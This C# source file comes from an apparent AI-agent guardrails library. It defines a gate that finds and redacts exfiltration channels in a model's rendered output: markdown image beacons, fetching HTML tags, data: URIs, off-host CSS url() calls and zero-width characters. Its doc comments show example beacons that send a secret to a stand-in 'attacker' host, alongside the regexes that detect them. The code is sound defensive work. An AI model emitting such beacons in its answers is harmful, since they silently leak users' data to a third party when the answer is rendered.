// SPDX-License-Identifier: MIT
// Copyright (c) 2026 AgentEval Contributors
// Licensed under the MIT License.

using System.Text;
using System.Text.RegularExpressions;

namespace AgentEval.Guardrails.Gates;

/// <summary>
/// A run-post <see cref="IChatGate"/> that neutralizes the exfiltration channels a client auto-fetches or hides
/// when it <b>renders</b> the model's output: markdown auto-loading images (<c>![alt](http://attacker/?d=secret)</c>),
/// HTML tags that fetch a resource (<c>img</c> / <c>script</c> / <c>iframe</c> / …), <c>data:</c> URIs, and
/// zero-width characters. This complements <c>DomainAllowListGate</c> (which guards tool-argument URLs) by guarding
/// the <b>rendered answer</b> — an allow-list can't see that a client silently GETs a markdown image on render.
/// <para>Post-flight it returns a <b>redacted</b> output (each channel replaced with a visible marker); under
/// <see cref="EvalGatePolicy.Redact"/> the client delivers the sanitized text. Each regex is bounded (ReDoS-safe);
/// if any scan times out the whole output is withheld (fail-closed).</para>
/// <para><b>Scope.</b> Covers markdown image beacons, fetching HTML (incl. SVG), off-host CSS <c>url()</c>,
/// <c>data:</c> URIs, and zero-width characters. It does <i>not</i> resolve <b>reference-style</b> markdown images
/// (<c>![x][ref]</c>, where the URL is defined elsewhere) — pair with an allow-list on the tool side for those.</para>
/// </summary>
public sealed class RenderedOutputExfilGate : IChatGate
{
    private static readonly TimeSpan MatchTimeout = TimeSpan.FromMilliseconds(100);

    private static readonly (string Name, Regex Pattern, string Replacement)[] Channels =
    {
        // ![alt](url) — the client GETs url on render; the classic markdown-image beacon.
        ("markdown-image", new Regex(@"!\[[^\]]*\]\([^)]*\)", RegexOptions.Compiled, MatchTimeout), "[image removed]"),
        // HTML tags that fetch a resource on render (incl. SVG <svg>/<use href>).
        ("fetching-html-tag", new Regex(@"<\s*(?:img|script|iframe|object|embed|link|audio|video|source|svg|use)\b[^>]*>", RegexOptions.Compiled | RegexOptions.IgnoreCase, MatchTimeout), "[markup removed]"),
        // data: URI — inline payload / covert channel.
        ("data-uri", new Regex(@"data:[^\s""')>\]]+", RegexOptions.Compiled | RegexOptions.IgnoreCase, MatchTimeout), "[data-uri removed]"),
        // CSS url() pointing off-host (e.g. background:url(//attacker/x)) — fetched on render.
        ("css-url", new Regex(@"url\(\s*['""]?(?:https?:)?//[^)]*\)", RegexOptions.Compiled | RegexOptions.IgnoreCase, MatchTimeout), "url([removed])"),
    };

    // Zero-width / invisible characters used as covert channels: ZWSP, ZWNJ, ZWJ, word-joiner, BOM.
    private static readonly char[] ZeroWidthChars = { (char)0x200B, (char)0x200C, (char)0x200D, (char)0x2060, (char)0xFEFF };

    /// <inheritdoc/>
    public string PolicyName => "rendered-output-exfil";

    /// <inheritdoc/>
    public ValueTask<GateVerdict> InspectAsync(string text, CancellationToken cancellationToken = default)
    {
        if (string.IsNullOrEmpty(text))
        {
            return new ValueTask<GateVerdict>(GateVerdict.Allow(PolicyName));
        }

        var found = new List<string>();
        var sanitized = text;
        var scanIncomplete = false;

        foreach (var (name, pattern, replacement) in Channels)
        {
            try
            {
                if (pattern.IsMatch(sanitized))
                {
                    found.Add(name);
                    sanitized = pattern.Replace(sanitized, replacement);
                }
            }
            catch (RegexMatchTimeoutException)
            {
                // A scan we couldn't complete: we can't prove the output is clean, so we can't hand back a
                // trustworthy redaction — fall back to withholding the whole output (below).
                found.Add($"{name}(scan-timeout)");
                scanIncomplete = true;
            }
        }

        if (sanitized.IndexOfAny(ZeroWidthChars) >= 0)
        {
            found.Add("zero-width");
            sanitized = StripChars(sanitized, ZeroWidthChars);
        }

        if (found.Count == 0)
        {
            return new ValueTask<GateVerdict>(GateVerdict.Allow(PolicyName));
        }

        // Fail-closed: if any scan timed out, `sanitized` still contains the un-neutralized channel, so under
        // Redact we must NOT deliver it — withhold the whole output instead of leaking partially-scanned content.
        var redacted = scanIncomplete
            ? "[output withheld — rendered-output exfil scan could not complete]"
            : sanitized;

        return new ValueTask<GateVerdict>(
            GateVerdict.Block(PolicyName, $"rendered-output exfil channels neutralized: {string.Join(", ", found)}", found, redactedText: redacted));
    }

    private static string StripChars(string s, char[] remove)
    {
        var set = new HashSet<char>(remove);
        var sb = new StringBuilder(s.Length);
        foreach (var c in s)
        {
            if (!set.Contains(c))
            {
                sb.Append(c);
            }
        }

        return sb.ToString();
    }
}
